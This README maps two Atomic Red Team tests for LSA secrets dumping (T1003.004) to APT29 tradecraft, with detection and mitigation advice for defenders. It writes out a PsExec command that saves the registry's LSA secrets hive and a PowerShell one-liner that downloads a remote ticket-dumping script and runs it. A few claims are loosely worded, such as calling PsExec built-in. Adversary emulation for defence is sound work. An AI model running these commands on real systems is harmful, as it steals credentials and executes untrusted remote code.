# Atomic Red Team Test for APT29 - T1003.004 OS Credential Dumping: LSA Secrets

This repository documents **Atomic Red Team tests for T1003.004 (OS Credential Dumping: LSA Secrets)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard).

The goal is to:
* Provide defenders with relevant tests for detecting LSA secrets dumping activities
* Map the test to known APT29 behaviors and campaigns
* Highlight specific techniques used by this threat group for credential access

---

## Background

* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
  * Highly skilled in credential access and lateral movement techniques
  * Uses **LSA secrets dumping** to obtain credentials for service accounts and privileged access

APT29 leverages T1003.004 (LSA Secrets Dumping) because it allows them to:
* Extract cached credentials and authentication materials from compromised systems
* Obtain service account passwords that can be used for lateral movement
* Gain persistence in enterprise environments by capturing critical credentials
* Escalate privileges by obtaining sensitive authentication data

---

## Atomic Test Analysis

### Atomic Test #1 - Dumping LSA Secrets
**Technique:** Registry-Based Credential Dumping  
**Adversary Usage:** APT29  
**Command:**
```cmd
PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
```
**Explanation:** APT29 has used this exact technique during their operations. The combination of PsExec (for SYSTEM privileges) with the reg save command to extract the LSA secrets hive is a hallmark of their tradecraft. This allows them to access cached credentials, service account passwords, and other sensitive authentication data stored in the registry.

**APT29 Correlation:** During the SolarWinds campaign, APT29 demonstrated sophisticated credential access techniques, including dumping LSA secrets to obtain credentials for lateral movement and persistence within victim environments.

### Atomic Test #2 - Dump Kerberos Tickets from LSA using dumper.ps1
**Technique:** Memory-Based Credential Extraction  
**Adversary Usage:** APT29  
**Command:**
```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
```
**Explanation:** APT29 has used PowerShell-based tools to extract Kerberos tickets from LSA memory. This technique allows them to obtain golden and silver tickets for persistence and lateral movement without triggering traditional credential dumping detection mechanisms.

---

## Correlation with APT29 Tradecraft

### APT29 Focus:
* **Registry Operations (#1)**: APT29 uses legitimate tools like reg.exe and PsExec to extract LSA secrets from the registry
* **PowerScript Execution (#2)**: APT29 employs PowerShell scripts for in-memory credential extraction
* **Living-off-the-Land**: Both techniques use built-in Windows utilities to avoid detection

### Tactical Objectives:
1. **Credential Access**: Extract cached credentials and service account passwords
2. **Lateral Movement**: Use obtained credentials to move through the network
3. **Persistence**: Maintain access using stolen authentication materials
4. **Privilege Escalation**: Gain higher-level access through credential theft

---

## Defender Notes

* These tests are high-value because they **closely emulate real-world APT29 tradecraft**
* Detection should focus on:
  * `reg save` operations targeting `HKLM\security\policy\secrets`
  * PsExec execution with SYSTEM privileges (-s flag)
  * PowerShell downloading and executing scripts from external sources
  * Files being written to temporary directories with names like "secrets"
  * Unusual parent-child process relationships involving PsExec

* Critical detection opportunities:
  * **Process creation**: reg.exe with save parameter targeting sensitive registry hives
  * **File creation**: Secrets files written to temp directories
  * **Network activity**: PowerShell downloading scripts from external sources
  * **Privilege escalation**: Processes running as SYSTEM performing unusual operations

### Mitigation Strategies:
* Implement application control to restrict unnecessary utilities like PsExec
* Monitor for registry operations targeting sensitive security hives
* Use privileged access management to limit SYSTEM account activities
* Implement network segmentation to limit lateral movement
* Regularly rotate service account credentials

## Campaign References

1. **APT29 SolarWinds Campaign** (2020): Used credential dumping techniques to extract service account credentials for lateral movement
2. **APT29 COVID-19 Vaccine Targeting** (2020): Employed LSA secrets dumping to gain persistent access to research networks
3. **Various APT29 Operations**: Consistently demonstrated advanced credential access capabilities

## Academic References

1. MITRE ATT&CK Technique T1003.004 - OS Credential Dumping: LSA Secrets
2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
3. US-CERT: "Russian SVR Activities" (APT29 TTPs)
4. FireEye: "APT29 Domain Fronting With TOR" (2017)
5. CrowdStrike: "APT29 Targets COVID-19 Vaccine Development" (2020)

## Detection Recommendations

* **SIEM Rules**: Alert on reg.exe saving HKLM\security\policy\secrets
* **EDR Monitoring**: Track PsExec spawning reg.exe with save operations
* **Network Monitoring**: Detect PowerShell downloading scripts from unknown sources
* **Behavioral Analysis**: Identify unusual SYSTEM account activities
* **File Monitoring**: Watch for secret files in temp directories